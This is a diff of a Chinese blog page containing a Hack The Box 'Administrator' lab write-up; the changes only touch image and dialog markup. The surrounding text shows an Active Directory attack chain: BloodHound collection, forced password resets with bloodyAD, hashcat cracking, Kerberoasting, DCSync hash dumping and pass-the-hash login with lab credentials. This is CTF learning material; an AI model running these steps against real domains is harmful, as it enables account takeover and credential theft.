@@ -135,9 +135,9 @@ INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: dc.administrator.htb
 INFO: Done <span class="hljs-keyword">in</span> 00M 26S        </code></pre></figure><p>将dc.administrator.htb添加至hosts</p>
 <p>windows可以使用SharpHound结合BloodHound来进行搜集和可视化</p>
-<figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd">.\SharpHound.exe --collectionmethods All --domain administrator.htb --ldapusername Olivia --ldappassword ichliebedich</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322143541002.png" alt="image-20250322143541002" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>cmd</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-cmd">.\SharpHound.exe --collectionmethods All --domain administrator.htb --ldapusername Olivia --ldappassword ichliebedich</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1537;--image-max-width:1266px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322143541002.png" alt="image-20250322143541002" loading="lazy" decoding="async" width="2560" height="1537"></span></figure></p>
 <p>分析中发现一条线</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322144635955.png" alt="image-20250322144635955" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1836 / 190;--image-max-width:7344px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322144635955.png" alt="image-20250322144635955" loading="lazy" decoding="async" width="1836" height="190"></span></figure></p>
 <p>修改密码</p>
 <figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">┌──(root㉿kali)-[/tmp]
 └─# bloodyAD -u <span class="hljs-string">&quot;olivia&quot;</span> -p <span class="hljs-string">&quot;ichliebedich&quot;</span> -d <span class="hljs-string">&quot;Administrator.htb&quot;</span> --host <span class="hljs-string">&quot;10.10.11.42&quot;</span> <span class="hljs-built_in">set</span> password <span class="hljs-string">&quot;Michael&quot;</span> <span class="hljs-string">&quot;12345678&quot;</span>
@@ -146,9 +146,9 @@ INFO: Done <span class="hljs-keyword">in</span> 00M 26S        </code></pre></fi
 ┌──(root㉿kali)-[/tmp]
 └─# bloodyAD -u <span class="hljs-string">&quot;Michael&quot;</span> -p <span class="hljs-string">&quot;12345678&quot;</span> -d <span class="hljs-string">&quot;Administrator.htb&quot;</span> --host <span class="hljs-string">&quot;10.10.11.42&quot;</span> <span class="hljs-built_in">set</span> password <span class="hljs-string">&quot;Benjamin&quot;</span> <span class="hljs-string">&quot;12345678&quot;</span>
 [+] Password changed successfully!</code></pre></figure><p>是<code>share Moderator</code>组的成员 因此可以尝试ftp登录一下</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322151342634.png" alt="image-20250322151342634" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:980 / 758;--image-max-width:983px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322151342634.png" alt="image-20250322151342634" loading="lazy" decoding="async" width="980" height="758"></span></figure></p>
 <p>ftp登录发现一个文件</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322145221361.png" alt="image-20250322145221361" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:578 / 291;--image-max-width:1510px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322145221361.png" alt="image-20250322145221361" loading="lazy" decoding="async" width="578" height="291"></span></figure></p>
 <p>psafe3是加密的密码安全文件，使用hashcat爆破密码</p>
 <figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">E:\小工具\HashcatGUI_cn_v1.3.1(密码爆破）\hashcat-6.2.6&gt;hashcat -m 5200 C:\Users\31702\Desktop\Backup.psafe3 rockyou.txt
 hashcat (v6.2.6) starting
@@ -264,13 +264,13 @@ Warning: <span class="hljs-title">Remote</span> <span class="hljs-title">path</s
 
 *<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">emily</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">type</span> <span class="hljs-title">user.txt</span>
 <span class="hljs-title">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
-*<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">emily</span>\<span class="hljs-title">Desktop</span>&gt; </span></code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322152545173.png" alt="image-20250322152545173" loading="lazy" decoding="async"></figure></p>
+*<span class="hljs-title">Evil</span>-<span class="hljs-title">WinRM</span>* <span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">emily</span>\<span class="hljs-title">Desktop</span>&gt; </span></code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1149 / 555;--image-max-width:1573px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322152545173.png" alt="image-20250322152545173" loading="lazy" decoding="async" width="1149" height="555"></span></figure></p>
 <p>继续分析刚才收集的信息，<code>emily</code>对用户<code>ethan</code>拥有<code>GenericWrite</code>权限</p>
 <blockquote>
 <p>允许攻击者对目标账户的属性进行修改</p>
 </blockquote>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322153717385.png" alt="image-20250322153717385" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322153007166.png" alt="image-20250322153007166" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1691 / 1256;--image-max-width:1023px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322153717385.png" alt="image-20250322153717385" loading="lazy" decoding="async" width="1691" height="1256"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1743 / 1068;--image-max-width:1240px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322153007166.png" alt="image-20250322153007166" loading="lazy" decoding="async" width="1743" height="1068"></span></figure></p>
 <blockquote>
 <p>Kerberos 协议在处理身份验证时，允许域内用户为拥有 <code>SPN</code>(Service Principal Name，标识服务实例的唯一名称) 的账户请求服务票据。</p>
 <p>这些票据通常是由账户的 NTLM 哈希加密生成的，只要域账户注册了<code>SPN</code>，攻击者就可以使用<code>Kerberos</code>请求服务票据并提取票据。因此攻击者可以通过离线破解服务票据(例如使用工具 <code>PowerView</code> 或 <code>GetUserSPNs.py</code>)间接得到目标账户的密码。</p>
@@ -385,7 +385,7 @@ Hardware.Mon.#3..: N/A
 Started: Sat Mar 22 15:49:52 2025
 Stopped: Sat Mar 22 15:50:12 2025</code></pre></figure><p>得到</p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">limpbizkit</code></pre></figure><p>接下来就是</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322155323546.png" alt="image-20250322155323546" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1660 / 668;--image-max-width:1889px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322155323546.png" alt="image-20250322155323546" loading="lazy" decoding="async" width="1660" height="668"></span></figure></p>
 <p>现在我们已经获取了 <code>ethan</code> 的密码，使用 BloodHound 检查他的权限。发现 <code>ethan</code> 的 FDOC权限间接赋予了他在域控制器 (Domain Controller, DC) 上的 <code>DCSync</code>权限。</p>
 <blockquote>
 <p>DCSync 是一种滥用 Active Directory (AD) 复制机制的攻击技术。拥有 DCSync 权限的用户可以模拟域控制器，向其他 DC 请求复制敏感数据，如 NTLM 哈希和 Kerberos 密钥。</p>
@@ -443,7 +443,7 @@ DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
 DC$:des-cbc-md5:f483547c4325492a
 [*] Cleaning up... 
 </code></pre></figure><p>使用-H 用hash登录</p>
-<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322155646562.png" alt="image-20250322155646562" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1153 / 471;--image-max-width:1860px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250322155646562.png" alt="image-20250322155646562" loading="lazy" decoding="async" width="1153" height="471"></span></figure></p>
 <p>下班</p>
 </article>
         <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
@@ -481,26 +481,26 @@ DC$:des-cbc-md5:f483547c4325492a
       </div>
     </footer>
     
-    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+    <dialog class="mobile-menu" data-mobile-menu aria-label="站点导航">
       <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
       <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
       <div class="mobile-menu-social">
     <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
     <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
     <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
-    </div>
+    </dialog>
     
-    <dialog class="search-dialog" data-search-dialog>
+    <dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-dialog-status">
       <div class="search-shell">
         <header class="search-header">
-          <span class="search-title">站内搜索</span>
+          <span class="search-title" id="search-dialog-title">站内搜索</span>
           <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
         </header>
         <label class="search-field">
           <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
           <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
         </label>
-        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <p class="search-status" id="search-dialog-status" data-search-status>输入关键词，查找 39 篇记录。</p>
         <div class="search-results" data-search-results aria-live="polite"></div>
         <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
       </div>
